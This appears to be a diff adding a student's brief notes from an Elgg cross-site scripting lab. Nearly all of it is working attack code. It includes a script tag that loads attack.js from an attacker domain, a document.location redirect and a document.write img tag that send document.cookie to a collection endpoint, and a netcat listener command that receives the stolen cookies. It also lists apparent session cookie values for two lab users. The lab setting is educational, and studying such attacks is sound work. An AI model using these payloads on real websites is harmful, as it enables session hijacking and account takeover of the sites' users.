@@ -1,0 +1,22 @@
+Write in brief description
+<script type="text/javascript" src="http://www.xsslabattacker.com/attack.js"></script>
+
+
+to steal cookie:
+document.location='http://www.xsslabattacker/cookiesteal.php?c='
++'"'+document.cookie+'"';
+
+
+
+samy cookie= Elgg=9jqpluq0n90j6vnujngbrt4pj5
+alice cookie= Elgg=90q1s6k7e6d8pnpfo8aqc0l2d3
+
+
+ TO listen a connection:
+ nc -l -k  5555 -v
+to steal cookie:
+ document.write('<img src=http://127.0.0.1:5555?c='
+	+ escape(document.cookie) + '   >');
+
+
+
